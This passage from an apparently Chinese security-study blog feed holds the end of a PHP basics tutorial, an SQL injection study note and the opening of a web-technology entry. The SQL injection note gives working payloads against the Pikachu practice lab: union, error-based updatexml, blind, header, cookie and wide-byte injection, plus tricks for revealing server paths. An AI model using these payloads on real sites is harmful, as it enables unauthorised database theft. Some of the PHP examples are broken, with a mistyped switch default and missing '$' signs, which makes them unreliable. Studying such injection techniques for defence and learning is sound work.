class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$tool&#x3D;rand(1,6);&#x2F;&#x2F;产生随机数的函数</span><br><span class="line"></span><br><span class="line">switch($tool)&#123;</span><br><span class="line"></span><br><span class="line">case 1:</span><br><span class="line"></span><br><span class="line">echo &#39;自己开车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">case 2:</span><br><span class="line"></span><br><span class="line">echo &#39;骑自行车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">case 3:&#x2F;&#x2F;选项块</span><br><span class="line"></span><br><span class="line">echo &#39;开小汽车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">defined:&#x2F;&#x2F;都不选的时候执行的语句块</span><br><span class="line"></span><br><span class="line">echo &#39;不回家&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;根据产生的随机数，选择不同模块</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.while循环语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; while循环语句</span><br><span class="line"></span><br><span class="line">$rom&#x3D;0;</span><br><span class="line"></span><br><span class="line">while($rom &lt;5)&#123;</span><br><span class="line"></span><br><span class="line">if($rom&#x3D;&#x3D;0)&#123;</span><br><span class="line"></span><br><span class="line">echo &#39;我刚进入循环&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line">echo &#39;我循环了&#39;.$rom.&#39;次&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rom++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#39;while循环结束了&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.for循环语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;for循环,foreach(数组1 as $value)  将数组赋值给value</span><br><span class="line"></span><br><span class="line">for (i&#x3D;1;i&lt;5;$i++)&#123;</span><br><span class="line"></span><br><span class="line">echo &#39;这是第&#39;.$i.&#39;次&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#39;for循环结束&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.goto语句<br>goto语句跳转之后会停止向下执行，直接执行跳转到的语句中继续执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">goto wan;</span><br><span class="line"></span><br><span class="line">echo &#39;我就是我，我喜欢我自己&#39;;</span><br><span class="line"></span><br><span class="line">wan:</span><br><span class="line"></span><br><span class="line">echo &#39;你不能那么自私,你要爱大家！&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">goto gril;</span><br><span class="line"></span><br><span class="line">gril:</span><br><span class="line"></span><br><span class="line">echo &#39;你还要爱你的女孩!&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h3><p>1.定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基本函数语法</span><br><span class="line"></span><br><span class="line">function love(i,l&#x3D;14)&#123;</span><br><span class="line"></span><br><span class="line">echo &#39;i love you &#39;.i.l;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">love(13);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.常用函数<br>**<strong>**</strong>数字函数</p><p>abs()  绝对值函数<br>pow(-1,20)  返回-1的20次方<br>min(1,2,3,4,5,6)  求这些数的最小值<br>max()   返回最大值<br>pi()    圆周率值<br>count()    计算数量</p><p><strong>****</strong>字符串函数<br>count_chars() 统计字符串中的所有字母</p><p><strong>****</strong>日期函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mytime &#x3D; getdate();</span><br><span class="line"></span><br><span class="line">echo &quot;年 :&quot;.$mytime[&#39;year&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;月 :&quot;.$mytime[&#39;mon&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;日 :&quot;.$mytime[&#39;mday&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;时 :&quot;.$mytime[&#39;hours&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;分 :&quot;.$mytime[&#39;minutes&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;一个小时中的第几钟 :&quot;.$mytime[&#39;minutes&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;这是一分钟的第几秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;星期名称 :&quot;.$mytime[&#39;weekday&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;月份名称 :&quot;.$mytime[&#39;month&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;时间戳   :&quot;.$mytime[0].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四、数组与数据结构"><a href="#四、数组与数据结构" class="headerlink" title="四、数组与数据结构"></a>四、数组与数据结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;数组与数据结构</span><br><span class="line"></span><br><span class="line">$shu&#x3D;array(1,1.5,20,true,&#39;我就是我，我爱我&#39;);</span><br><span class="line"></span><br><span class="line">var_dump($shu);</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;&#x2F;&#x2F;区别</span><br><span class="line"></span><br><span class="line">echo $shu.&#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$num&#x3D;array(1,2,3,4,5,6,7,8,9,10);</span><br><span class="line"></span><br><span class="line">echo $num[0].&#39;&lt;br&gt;&#39;;&#x2F;&#x2F;单个输出</span><br><span class="line"></span><br><span class="line">for (i&#x3D;0;i&lt;9;$i++)&#123;&#x2F;&#x2F;遍历数组</span><br><span class="line"></span><br><span class="line">echo num[i].&#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;数组遍历元素</span><br><span class="line"></span><br><span class="line">$mingren &#x3D; array(&quot;邓超&quot;, &quot;黄晓明&quot;, &quot;宁泽涛&quot;, &quot;钟汉良&quot;);</span><br><span class="line"></span><br><span class="line">dc &#x3D; array_shift(mingren);</span><br><span class="line"></span><br><span class="line">echo $dc .&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line"></span><br><span class="line">print_r($mingren);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="五、正则表达式"><a href="#五、正则表达式" class="headerlink" title="五、正则表达式"></a>五、正则表达式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;php 正则表达式</span><br><span class="line"></span><br><span class="line">$zz &#x3D; &#39;&#x2F;w.+q&#x2F;&#39;;&#x2F;&#x2F;&#39;&#x2F;w.+q&#x2F;U&#39;为懒惰模式，输出结果为w_q</span><br><span class="line"></span><br><span class="line">$string &#x3D; &#39;sssssw__qqqqqqaaaaaa&#39;;</span><br><span class="line"></span><br><span class="line">if(preg_match(zz, string, $matches))&#123;</span><br><span class="line"></span><br><span class="line">   echo &#39;匹配到了，结果为：&#39;;</span><br><span class="line"></span><br><span class="line">   var_dump($matches);</span><br><span class="line"></span><br><span class="line">   print_r( &#39;&lt;br&gt;&#39;.$matches);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;&#x2F;&#x2F;分割线符号</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$subject &#x3D; &quot;test__123123123&quot;;</span><br><span class="line"></span><br><span class="line">preg_match(&#39;&#x2F;test.+123&#x2F;&#39;, subject, matches); &#x2F;&#x2F;贪婪模式 </span><br><span class="line"></span><br><span class="line">var_dump($matches);</span><br><span class="line"></span><br><span class="line">preg_match(&#39;&#x2F;test.+123&#x2F;U&#39;, subject, matches); &#x2F;&#x2F;懒惰模式</span><br><span class="line"></span><br><span class="line">var_dump($matches);</span><br><span class="line"></span><br><span class="line">preg_filter(&#39;&#x2F;test.+123&#x2F;&#39;,subject,matches);</span><br><span class="line"></span><br><span class="line">var_dump($matches);&#x2F;&#x2F;匹配结果与懒惰模式一样，</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>删除表中的某个字段：delete from user where id=5；</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 开发 </tag>
            
            <tag> web </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="2020/09/12/sql%E6%B3%A8%E5%85%A5/"/>
      <url>2020/09/12/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="注入总结图"><a href="#注入总结图" class="headerlink" title="注入总结图"></a>注入总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.png"></p><h4 id="1-0-原理"><a href="#1-0-原理" class="headerlink" title="1.0 原理"></a>1.0 原理</h4><p>注入产生的原因是接受相关参数未经处理直接带入数据库查询操作</p><h4 id="1-1-攻击条件"><a href="#1-1-攻击条件" class="headerlink" title="1.1 攻击条件"></a>1.1 攻击条件</h4><ul><li><strong>确定Web应用程序所使用的技术</strong><ul><li>可以考察Web页面的页脚</li><li>查看错误页面</li><li>检查页面源代码</li><li>使用诸如Nessus、AWVS、APPSCAN等工具来进行刺探</li></ul></li><li><strong>确定所有可能的输入方式</strong><ul><li>HTML表单</li><li>通过隐藏的HTML表单输入、HTTP头部、cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互M</li><li>HTTP的GET和POST</li></ul></li><li><strong>查找可以用于注射的用户输入</strong><ul><li>多留意Web应用的错误页面</li></ul></li></ul><h4 id="1-2-注入前的准备及注入漏洞检测"><a href="#1-2-注入前的准备及注入漏洞检测" class="headerlink" title="1.2  注入前的准备及注入漏洞检测"></a>1.2  注入前的准备及注入漏洞检测</h4><ol><li><p>显示友好HTTP错误信息</p><ul><li>取消IE浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息</li><li>打开IE浏览器，选择菜单“工具”一“Internet选项”命令，打开“Internet选项”对话框。打开“高级”选项卡，在“设置”列表框中找到“浏览组”，取消勾选“显示友好HTTP错误信息”</li></ul></li><li><p>手工检测sql注入点</p><ul><li><p>寻找如下形式的网页链接。（最常见）</p><p><a href="http://www.*****.com/***.asp?id=xx">http://www.*****.com/***.asp?id=xx</a> (ASP注入)</p><p><a href="http://www.*****.com/index.asp?id=8&amp;page=99">http://www.*****.com/index.asp?id=8&amp;page=99</a> </p><p>(注:注入的时候确认是id参数还是page参数，工具默认只对后面page参数注入，所以要对工具进行配置或者手工调换) </p></li><li><p>检测方法</p><ul><li><strong>“单引号”法</strong></li><li><strong>1=1和1=2法</strong></li></ul></li></ul></li></ol><h4 id="1-3-注入分类"><a href="#1-3-注入分类" class="headerlink" title="1.3  注入分类"></a>1.3  注入分类</h4><ol><li><p>数字型(or 1=1)</p><ul><li><p>通过burp抓包输入一个or 1=1设置一个payload,点击提交后，在Render中查看结果。通过判断存在SQL注入，且为数字型注入，可以通过拼接SQL语句来实现注入。</p><p><img src="/image/sql/sql-1.png"></p></li></ul></li><li><p>字符型(‘or 1=1#’)</p><ul><li><p>在vince后面添加单引号来闭合vince，再在1=1后面添加注释#来消除掉后面的单引号，这样来完成一个SQL语句的拼接合法性。完整的语句为select id,email from member where username=’vince‘ or 1=1#’；我们回到pikachu平台输入vince‘ or 1=1#</p><p><img src="/image/sql/sql-2.png"></p></li></ul></li><li><p>搜索型(%xxxx%’or 1=1 #%’)</p><ul><li><p>将拼接语句写为%xxxx%’or 1=1 #%’</p><p><img src="/image/sql/sql-3.png"></p></li></ul></li><li><p>xx型(XX’) or 1=1#)</p><ul><li><p>XX型是由于SQL语句拼接方式不同</p></li><li><p>拼接语句写为XX’) or 1=1#</p><p><img src="/image/sql/sql-4.png"></p></li></ul></li></ol><h4 id="1-4-注入提交方式"><a href="#1-4-注入提交方式" class="headerlink" title="1.4  注入提交方式"></a>1.4  注入提交方式</h4><p>ASP：request （全部接受）、request.querystring （接受get）、request.form （接受post）、 request.cookie cookie （接受cookie）</p><p>PHP:<code> $_REQUEST（全部接受）</code>、<code>$_GET $_POST （接受post）</code>、<code>$_COOKIE（接受cookie）</code></p><h4 id="1-5-注入攻击类型与方式"><a href="#1-5-注入攻击类型与方式" class="headerlink" title="1.5   注入攻击类型与方式"></a>1.5   <strong>注入攻击类型与方式</strong></h4><ul><li><p>union注入</p><ul><li><p>union操作符用于合并两个或多个SQL语句集合起来，得到联合的查询结果</p><p><strong>select id,email from member where username=’kevin’ union select username,pw from member where id=1;</strong></p><p><strong>注：union操作符一般与order by语句配合使用</strong></p><ul><li><p>输入a’ order by 3#% ，通过这个简单的办法找到主查询一共有三个字段</p><p><img src="/image/sql/sql-5.png"></p></li><li><p>之后我们来使用union来做一个SQL语句的拼接。输入构造好的语句a’ union select database(),user(),version()#%</p><p><img src="/image/sql/sql-6.png"></p></li></ul></li></ul></li><li><p>information_schema注入</p><ul><li>information_schema数据库是MySQL系统自带的数据库</li><li>通过information_schema注入，我们可以将整个数据库内容全部窃取出来, <ul><li>使用order by来判断查询的字段</li><li>找出数据库的名称，输入vince’ union select database(),user(),3#%</li><li>获取pikachu数据库的<strong>表名</strong>，输入:u’ union select table_schema ,table_name,3 from information_schema.tables where table_schema=’pikachu’#</li><li>获取pikachu数据库的<strong>字段名</strong>，输入： k’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’#%</li><li>最后获取<strong>字段值</strong>的内容，输入：kobe’union select username ,password,3 from users#%</li></ul></li></ul></li><li><p>基于函数的报错</p><ul><li><p>条件：后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端</p></li><li><p><strong>三个常用的用来报错的函数</strong></p><ul><li><p>updatexml（）:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.</p><p>1、爆数据库版本信息</p><p>k’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</p><p>2、爆数据库当前用户</p><p>k’ and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#  </p><p>3、爆数据库</p><p>k’ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</p><p>4、爆表</p><p>获取数据库表名，输入：k’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’)),0)#，但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</p><p>输入k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’limit 0,1)),0)#更改limit后面的数字limit 0完成表名遍历。</p><p>5、爆字段</p><p>获取字段名，输入：k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit <strong>2</strong>,1)),0)#</p><p>6、爆字段内容</p><p>获取字段内容，输入：k’ and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</p></li><li><p>extractvalue（） :函数也是MYSQL对XML文档数据进行查询的XPATH函数.</p></li><li><p>floor（）:MYSQL中用来取整的函数.</p></li></ul></li></ul></li><li><p>insert注入</p><ul><li><p>前端注册的信息最终会被后台通过insert这个操作插入数据库，后台在接受前端的注册数据时没有做防SQL注入的处理</p></li><li><p>进入网站注册页面，填写网站注册相关信息，通过Burp抓包在用户名输入相关payload</p><p>oldboy’or updatexml(1,concat(0x7e,(命令)),0) or’</p><p>\1. 爆表名</p><p>oldboy’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’</p><p><img src="/image/sql/wps1.jpg" alt="img"> </p><p>\2. 爆列名</p><p>‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit 2,1)),0) or’</p><p><img src="/image/sql/wps2.jpg" alt="img"> </p><p>\3. 爆内容</p><p>‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’ 等同</p><p>‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ‘1’=’1’’</p></li></ul></li><li><p>uodate注入</p><ul><li><p>与insert注入的方法大体相同，区别在于update用于用户登陆端，insert用于用于用户注册端</p><p>‘ or updatexml(0,concat(0x7e,(database())),0) or’</p></li></ul></li><li><p>dalete注入</p><ul><li><p>一般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入</p><p>delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)</p></li></ul></li><li><p>http header注入</p><ul><li>User-Agent输入payload Mozilla’ or updatexml(1,concat(0x7e,database ()),0) or ‘html&gt;</li></ul></li><li><p>cookie注入</p><ul><li>如果后端获取Cookie后放在数据库中进行拼接，那么这也将是一个SQL注入点</li><li>在 ant[uname]=admin后添加一个’观察反馈的MYSQL的语法报错，发现了存在SQL注入漏洞，在设置Payload ‘and updatexml (1,concat(0x7e,database()),0)#,观察报错和之前是否相同</li></ul></li><li><p>盲注(base on boolian)、盲注(base on time)</p><ul><li><p>布尔盲注</p><ul><li><p>在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><p>输入语句select ascii(substr(database(),1,1))&gt;xx;通过对比ascii码的长度，判断出数据库表名的第一个字符。</p><p><strong>注: substr()函数</strong></p><p>string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被返回字符串的长度。</p></li><li><p>在实际操作中通常不会使用手动盲注的办法，可以使用sqlmap等工具来增加盲注的效率。</p></li></ul></li><li><p>时间盲注</p><ul><li><p>payload: vince’ and sleep(x)#</p></li><li><p>vince’ and if(substr(database(),1,1)=’X’ (猜测点)’,sleep(10),null#</p><p>输入后，如果猜测真确，那么就会响应10秒，如果错误会立刻返回错误。</p></li><li><p>输入：vince’ and if(substr(database(),1,1)=’p’,sleep(10),null)#</p><p>在web控制台下，判断出database的表名的一个字符为p</p></li></ul></li></ul></li><li><p>宽字节注入</p><ul><li><p>当我们把php.ini文件里面的magic_quotes_gqc参数设为ON时，所有的’（单引号），”(双引号)，(反斜杠)和null字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。</p><p>其中\的十六进制是 %5C ，当我们在单引号前面加上%df的时候，最终就会变成 運’，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df 是一个宽字符，也就是運，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p><p>‘ =======&gt;&#39;单引号转义后占两个字节，所以我们需要通过繁体字%df构造两个字节,最终用運干掉了\，也就是说被運占领了\ 所以最后在页面也不会显示出来.</p></li><li><p><strong>哪些地方没有魔术引号的保护？</strong></p><p>（1） $_SERVER 变量</p><p>  PHP5的$_SERVER变量缺少magic_quotes_gqc的保护，导致近年来X-Forwarded-For的漏洞猛爆，所以很多程序员考虑过滤X-Forwarded-For，但是其它的变量呢？</p><p>（2）getenv()得到的变量（使用类似$_SERVER 变量）</p><p>（3）$HTTP_RAW_POST_DATA与PHP输入、输出流</p></li></ul></li></ul><ol><li><p>内置变量爆数据库类型</p><p>“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型</p><p>方法：在注入点之后提交   and user&gt;0</p><p>错误信息：</p><p>​    Microsoft OLE DB Provider for SQL Server 错误’80040e21’（MS SQL数据库）</p><p>​    将nvarchar值’’转换为数据类型为int的列时发生语法错误。（Access数据库）</p></li></ol><h4 id="1-6实战"><a href="#1-6实战" class="headerlink" title="1.6实战"></a>1.6实战</h4><p> access 数据库<a href="https://www.jianshu.com/p/fc1e26d3ad45">https://www.jianshu.com/p/fc1e26d3ad45</a></p><p>mysql 数据库<a href="https://www.jianshu.com/p/f98ab1b4b12e">https://www.jianshu.com/p/f98ab1b4b12e</a></p><h4 id="1-7获取Web路径"><a href="#1-7获取Web路径" class="headerlink" title="1.7获取Web路径"></a>1.7<strong>获取Web路径</strong></h4><p>(1)一般可以在变量后面加上单引号、改变参数类型、增加参数位数等来造成MySQL数据库出错，爆出Web物理路径。</p><p>（2）通过扫描器扫web服务器遗留文件 php.php、info.php、phpinfo.php、test.php</p><p>（3）利用搜索引擎来查找Web目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在Google或百度中搜索“mysql site:<strong><em>.com”或“warning site:</em></strong>.com,error site:***.com.cn”等。</p><p>这里使用“error site:***.com”关键字进行查询，从搜索结果中得到了网站的物理路径为“E:\pujing2015”。</p><p>(4) 漏洞暴路径，例如通过网站后台查看网站Web路径、CC攻击暴路径等.</p><p>(6)通过配置文件找网站路径,在百度里面输入***配置文件,如:IIS6.0配置文件，可以找到: C:\WINDOWS\system32\inetsrv\MetaBase.xml 和C:\WINDOWS\system32\inetsrv\MetaBase.bin 这两个配置文件（小技巧:在百度里面输入:load_file()常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用程序技术</title>
      <link href="2020/09/12/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF/"/>
      <url>2020/09/12/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-应用程序技术"><a href="#Web-应用程序技术" class="headerlink" title="Web 应用程序技术"></a>Web 应用程序技术</h1><p>Web应用程序使用各种不同的技术实现其功能。本章简要介绍渗透侧试员在攻击Web应用程序时可能遇到的关键技术。我们将分析HTTP协议、服务器和客户端常用的技术以及用于在各种情形下呈现数据的编码方案。这些技术大都简单易懂，掌握其相关特性对于向Web应用程序发动有效攻击极其重要。</p><h2 id="1、cookie与session的区别"><a href="#1、cookie与session的区别" class="headerlink" title="1、cookie与session的区别"></a>1、cookie与session的区别</h2><p>1、cookie数据存放在客户的浏览器上，session数据放在服务器上。</p><p>2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗考虑到安全应当使用session。</p><p>3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能考虑到减轻服务器性能方面，应当使用COOKIE。</p><p>4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p><p>5、所以个人建议：将登陆信息等重要信息存放为SESSION</p><p>其他信息如果需要保留，可以放在COOKIE中</p><h2 id="2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X-Forwarded-for、Location各请求头的含义"><a href="#2、用自己的语言描述get、post、Accept、Referer、User-Agent、host、cookie、X-Forwarded-for、Location各请求头的含义" class="headerlink" 